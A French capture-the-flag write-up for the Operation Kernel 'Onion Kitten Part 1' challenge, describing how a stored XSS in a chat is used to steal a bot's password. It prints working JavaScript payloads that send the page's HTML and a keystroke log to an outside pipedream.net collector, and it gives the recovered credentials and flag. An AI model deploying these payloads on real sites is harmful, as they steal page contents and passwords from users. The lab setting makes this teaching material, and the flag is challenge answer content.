# Onion Kitten Part 1
## Description :
Nous avons découvert un forum assez suspect dans les mails précedemment découverts. Trouvez un moyen de vous connecter et de récupérer les identifiants d'un utilisateur pour découvrir ce qu'il se trame.

## Information complémentaire : 
Un chat est disponible, il est potentiellement vulnérable. Il n'est pas utile d'usurper la session de l'utilisateur, nous avons besoin de son mot de passe !

## Source :
https://ia.challenge.operation-kernel.fr/

---

## Resolution : 
Indice mis à notre disposition :
- Il est indiqué que j'ai besoin de récupérer son mot de passe.

En allant sur le site, j'ai remarqué qu'il y'avait une partie "Chat". Je rentre mon username et j'essaie de voir s'il y a une XSS en envoyant dans le chat `<script>alert(1)</script>`, j'ai bien une pop-up qui apparaît avec écrit 1.

A partir d'ici, je sais que je peux exploiter une faille XSS pour réussir à avoir le mot de passe de l'utilisateur. Je suis un tuto qui est présent sur ce site : (XSS Password Stealing)[https://medium.com/dark-roast-security/password-stealing-from-https-login-page-and-csrf-bypass-with-reflected-xss-76f56ebc4516].

Après plusieurs essaie, je me rends compte que l'utilisateur n'envoie pas de requête submit ou c'est protégé. J'utilise le site [Requestbin](https://pipedream.com/requestbin) afin de vérifier si l'utilisateur est déjà connecté ou non, grâce à ce code qui me permet de recevoir ce que l'utilisateur voit en arrivant sur le site : 
```
var XHR = new XMLHttpRequest();
XHR.open('POST', 'https://eowk3k3zl6kfmdt.m.pipedream.net', true);
XHR.send(encodeURIComponent(document.body.innerHTML));
```
En décodant le body, je peux remarquer qu'il est n'est pas connecté et que son nom dans le chat est "bot".

Je me dis qu'il a sûrement une protection sur le submit donc je décide de faire un payload permettant de récupérer les touches tapés par le bot.

```
let i = 0;
function logKey(e){ 
    i++;
    fetch(`https://eowk3k3zl6kfmdt.m.pipedream.net/?key=${e.key}&type=${e.target.id}&number=${i}`);
}
document.addEventListener('keypress', logKey);
``` 
Ce script permet de recevoir la touche qui a été pressé grâce à l'option `e.key`, l'option `e.target.id` permet de savoir s'il a été saisi dans le login ou password et le number `i` me permet de savoir dans quel ordre je dois positionner ce que je reçois en lettre.

Une fois que toutes les requêtes reçu et traités j'obtiens ça :
- Login : Shopeors
- Mot de passe : X5S_4_3V3r!!

Voici le flag final : `HACK{X5S_4_3V3r!!}`